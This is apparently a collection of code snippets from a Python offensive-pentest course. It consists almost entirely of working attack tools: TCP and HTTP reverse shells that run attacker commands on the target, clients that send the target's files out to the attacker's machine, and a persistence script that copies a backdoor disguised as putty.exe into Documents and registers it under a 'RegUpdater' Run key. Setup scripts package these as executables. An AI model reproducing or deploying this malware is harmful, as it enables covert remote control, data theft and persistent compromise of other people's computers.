["```\napt-get install idle\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Basic TCP Server \n\nimport socket # For Building TCP Connection\n\ndef connect():\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'\n\n    s.bind((\"10.0.2.15\", 8080)) # define the kali IP and the listening port\n\n    s.listen(1) # define the backlog size, since we are expecting a single connection from a single\n                                                            # target we will listen to one connection\n\n    print '[+] Listening for incoming TCP connection on port 8080'\n\n    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source\n                                # port in a tuple format (IP,port)\n\n    print '[+] We got a connection from: ', addr\n\n    while True:\n\n        command = raw_input(\"Shell> \") # Get user input and store it in command variable\n\n        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop\n            conn.send('terminate')\n            conn.close()\n            break\n\n        else:\n            conn.send(command) # Otherwise we will send the command to the target\n            print conn.recv(1024) # and print the result that we got back\n\ndef main ():\n    connect()\nmain()\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Basic TCP Client\n\nimport socket # For Building TCP Connection\nimport subprocess # To start the shell in the system\n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' \n    s.connect(('10.0.2.15', 8080)) # Here we define the Attacker IP and the listening port\n\n    while True: # keep receiving commands from the Kali machine\n        command = s.recv(1024) # read the first KB of the tcp socket\n\n        if 'terminate' in command: # if we got terminate order from the attacker, close the socket and break the loop\n            s.close()\n            break \n\n        else: # otherwise, we pass the received command to a shell process\n\n            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            s.send( CMD.stdout.read() ) # send back the result\n            s.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error\n\ndef main ():\n    connect()\nmain()\n```", "```\n netstat -antp | grep \"8080\"\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# TCP Data Exfiltration Server\n\nimport socket \nimport os # Needed for file operation\n\n# In the transfer function, we first create a trivial file called \"test.png\" as a file holder just to hold the \n# received bytes , then we go into infinite loop and store the received data into our file holder \"test.png\", however\n# If the requested file doesn't exist or if we reached the end of the file then we will break the loop\n# note that we could know the end of the file, if we received the \"DONE\" tag from the target side\n\n# Keep in mind that you can enhance the code and dynamically change the test.png to other file extension based on the user input\n\ndef transfer(conn,command):\n\n    conn.send(command)\n    f = open('/root/Desktop/test.png','wb')\n    while True: \n        bits = conn.recv(1024)\n        if 'Unable to find out the file' in bits:\n            print '[-] Unable to find out the file'\n            break\n        if bits.endswith('DONE'):\n            print '[+] Transfer completed '\n            f.close()\n            break\n        f.write(bits)\n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind((\"10.0.2.15\", 8080))\n    s.listen(1)\n    print '[+] Listening for incoming TCP connection on port 8080'\n    conn, addr = s.accept()\n    print '[+] We got a connection from: ', addr\n\n    while True: \n        command = raw_input(\"Shell> \")\n        if 'terminate' in command:\n            conn.send('terminate')\n            conn.close() \n            break\n\n# if we received grab keyword from the user input, then this is an indicator for\n# file transfer operation, hence we will call transfer function\n\n# Remember the Formula is grab*<File Path>\n# Example: grab*C:\\Users\\Hussam\\Desktop\\photo.jpeg\n\n        elif 'grab' in command: \n            transfer(conn,command)\n\n        else:\n            conn.send(command) \n            print conn.recv(1024) \n\ndef main ():\n    connect()\nmain()\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# TCP Data Exfiltration Client\n\nimport socket \nimport subprocess \nimport os # needed for file operations\n\n# In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker\n# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the\n# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file\n\ndef transfer(s,path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while packet != '':\n            s.send(packet) \n            packet = f.read(1024)\n        s.send('DONE')\n        f.close()\n\n    else: # the file doesn't exist\n        s.send('Unable to find out the file')\n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('10.0.2.15', 8080))\n\n    while True: \n        command = s.recv(1024)\n\n        if 'terminate' in command:\n            s.close()\n            break \n\n# if we received grab keyword from the attacker, then this is an indicator for\n# file transfer operation, hence we will split the received commands into two\n# parts, the second part which we intrested in contains the file path, so we will\n# store it into a variable called path and pass it to transfer function\n\n# Remember the Formula is grab*<File Path>\n# Example: grab*C:\\Users\\Hussam\\Desktop\\photo.jpeg\n\n        elif 'grab' in command: \n            grab,path = command.split('*')\n\n            try: # when it comes to low level file transfer, a lot of things can go wrong, therefore\n                                          # we use exception handling (try and except) to protect our script from being crashed\n                                          # in case something went wrong, we will send the error that happened and pass the exception\n                transfer(s,path)\n            except Exception,e:\n                s.send ( str(e) ) # send the exception error\n                pass\n\n        else:\n            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            s.send( CMD.stdout.read() ) \n            s.send( CMD.stderr.read() ) \n\ndef main ():\n    connect()\nmain()\n```", "```\n# py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/\n\nfrom distutils.core import setup\nimport py2exe , sys, os\n\nsys.argv.append(\"py2exe\")\nsetup(\n    options = {'py2exe': {'bundle_files': 1}},\n\n    windows = [{'script': \"Client.py\"}], \n    zipfile = None,\n\n)\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Basic HTTP Server\n\nimport BaseHTTPServer # Built-in library we use to build simple HTTP server \n\nHOST_NAME = '10.10.10.100' # Kali IP address \nPORT_NUMBER = 80 # Listening port number \n\nclass MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST request\n                                                          # from the client / target\n\n    def do_GET(s):\n                                         #If we got a GET request, we will:- \n        command = raw_input(\"Shell> \") #take user input\n        s.send_response(200) #return HTML status 200 (OK)\n        s.send_header(\"Content-type\", \"text/html\") # Inform the target that content type header is \"text/html\"\n        s.end_headers()\n        s.wfile.write(command) #send the command which we got from the user input\n\n    def do_POST(s):\n                                                     #If we got a POST, we will:- \n        s.send_response(200) #return HTML status 200 (OK)\n        s.end_headers()\n        length = int(s.headers['Content-Length']) #Define the length which means how many bytes the HTTP POST data contains, the length\n                                                     #value has to be integer \n        postVar = s.rfile.read(length) # Read then print the posted data\n        print postVar\n\nif __name__ == '__main__':\n\n    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)\n\n    server_class = BaseHTTPServer.HTTPServer\n    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)\n\n    try: \n        httpd.serve_forever() # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server\n    except KeyboardInterrupt: \n        print '[!] Server is terminated'\n        httpd.server_close()\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Basic HTTP Client\n\nimport requests # Download Link https://pypi.python.org/pypi/requests#downloads , just extract the rar file and follow the video :)\nimport subprocess \nimport time\n\nwhile True: \n\n    req = requests.get('http://10.0.2.15') # Send GET request to our kali server\n    command = req.text # Store the received txt into command variable\n\n    if 'terminate' in command:\n        break \n\n    else:\n        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() ) # POST the result \n        post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() ) # or the error -if any-\n\n    time.sleep(3)\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# HTTP Data Exfiltration Client\n\nimport requests \nimport subprocess \nimport os\nimport time\n\nwhile True: \n\n    req = requests.get('http://10.0.2.15')\n    command = req.text\n\n    if 'terminate' in command:\n        break # end the loop\n\n# Now similar to what we have done in our TCP reverse shell, we check if file exists in the first place, if not then we \n# notify our attacker that we are unable to find the file, but if the file is there then we will :-\n# 1.Append /store in the URL\n# 2.Add a dictionary key called 'file'\n# 3.requests library use POST method called \"multipart/form-data\" when submitting files\n\n#All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output\n#Please see the server script for more details on how we can use these points to get the file\n\n    elif 'grab' in command:\n\n        grab,path=command.split('*') # split the received grab command into two parts and store the second part in path variable\n\n        if os.path.exists(path): # check if the file is there\n\n            url = 'http://10.0.2.15/store' # Appended /store in the URL\n            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself\n            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called \"multipart/form-data\"\n\n        else:\n            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )\n\n    else:\n        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() )\n        post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() )\n\n    time.sleep(3)\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# HTTP Data Exfiltration Server\n\nimport BaseHTTPServer\n\nimport os, cgi\n\nHOST_NAME = '10.0.2.15' \nPORT_NUMBER = 80 \n\nclass MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):\n\n    def do_GET(s):\n\n        command = raw_input(\"Shell> \")\n        s.send_response(200)\n        s.send_header(\"Content-type\", \"text/html\")\n        s.end_headers()\n        s.wfile.write(command)\n\n    def do_POST(s):\n\n        # Here we will use the points which we mentioned in the Client side, as a start if the \"/store\" was in the URL\n        # then this is a POST used for file transfer so we will parse the POST header, if its value was 'multipart/form-data' then we\n        # will pass the POST parameters to FieldStorage class, the \"fs\" object contains the returned values from FieldStorage in dictionary fashion\n\n        if s.path == '/store':\n            try:\n                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))\n                if ctype == 'multipart/form-data' :\n                    fs = cgi.FieldStorage( fp = s.rfile, \n                                        headers = s.headers, \n                                        environ={ 'REQUEST_METHOD':'POST' } \n                                      )\n                else:\n                    print \"[-] Unexpected POST request\"\n\n                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'\n                                    # to hold the actual file. Now here to retrieve the actual file, we use the corresponding key 'file'\n\n                with open('/root/Desktop/1.txt', 'wb') as o: # create a file holder called '1.txt' and write the received file into this '1.txt' \n                    o.write( fs_up.file.read() )\n                    s.send_response(200)\n                    s.end_headers()\n            except Exception as e:\n                print e\n\n            return # once we store the received file in our file holder, we exit the function\n\n        s.send_response(200)\n        s.end_headers()\n        length = int(s.headers['Content-Length'])\n        postVar = s.rfile.read(length )\n        print postVar\n\nif __name__ == '__main__':\n    server_class = BaseHTTPServer.HTTPServer\n    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        print '[!] Server is terminated'\n        httpd.server_close()\n```", "```\nwine putty.exe\n```", "```\n# py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/\n\n# HTTP Exporting to EXE Client Setup\n\nfrom distutils.core import setup\nimport py2exe , sys, os\n\nsys.argv.append(\"py2exe\")\nsetup(\n    options = {'py2exe': {'bundle_files': 1}},\n\n    windows = [{'script': \"HTTP_Client.py\"}], \n    zipfile = None,\n\n)\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Persistence\n\nimport os # needed for getting working directory\nimport shutil # needed for file copying\nimport subprocess # needed for getting user profile\nimport _winreg as wreg # needed for editing registry DB\n\n# Reconn Phase\n\npath = os.getcwd().strip('/n') #Get current working directory where the backdoor gets executed, we use the output to build our source path\n\nNull,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')\n#Get USERP ROFILE which contains the username of the profile and store it in userprof variable , we use the output to build our destination path\n#Other way to discover the userprofile is via os.getenv('userprofile') , both will give the same result \n\ndestination = userprof.strip('\\n\\r') + '\\\\Documents\\\\' +'putty.exe'\n#build the destination path where we copy your backdoor - in our example we choosed C:\\Users\\<UserName>\\Documents\\\n\n# First and Second Phases\n\nif not os.path.exists(destination): # this if statement will be False next time we run the script because our putty.exe will be already copied in destination \n\n    #First time our backdoor gets executed\n    #Copy our Backdoor to C:\\Users\\<UserName>\\Documents\\\n    shutil.copyfile(path+'\\putty.exe', destination)\n\n    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\",0,\n                         wreg.KEY_ALL_ACCESS)\n    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)\n    key.Close()\n    #create a new registry string called RegUpdater pointing to our\n    #new backdoor path (destination)\n\n#If the script worked fine, out putty.exe should be copied to C:\\Users\\<UserName>\\Documents\\ and a new registry key called 'RegUpdater' should be created\n#and pointing to C:\\Users\\<UserName>\\Documents\\putty.exe \n```", "```\n# py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/\n\n# Persistence Setup\n\nfrom distutils.core import setup\nimport py2exe , sys, os\n\nsys.argv.append(\"py2exe\")\nsetup(\n    options = {'py2exe': {'bundle_files': 1}},\n\n    windows = [{'script': \"Persistence.py\"}], \n    zipfile = None,\n\n)\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Tunning\n\nimport os\nimport shutil\nimport subprocess\nimport _winreg as wreg\n\nimport requests \nimport time\n\n...\n\n#Last phase is to start a reverse connection back to our kali machine\nimport random\ndef connect():\n    while True: \n\n        req = requests.get('http://10.0.2.15')\n        command = req.text\n\n        if 'terminate' in command:\n            return 1 \n\n        elif 'grab' in command:\n\n            grab,path=command.split('*')\n            if os.path.exists(path):\n                url = 'http://10.0.2.15/store'\n                files = {'file': open(path, 'rb')}\n                r = requests.post(url, files=files)\n            else:\n                post_response = requests.post(url='http://10.0.2.15', data=\n                                          '[-] Not able to find the file !' )\n\n        else:\n            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n            post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() )\n            post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() )\n    time.sleep(3)\n\nwhile True:\n    try:\n        if connect()==1:\n                break\n    except:\n        sleep_for = random.randrange(1,10)\n        time.sleep( sleep_for )\n        #time.sleep( sleep_for ) #sleep for a random time between 1-10 minutes\n        pass\n```"]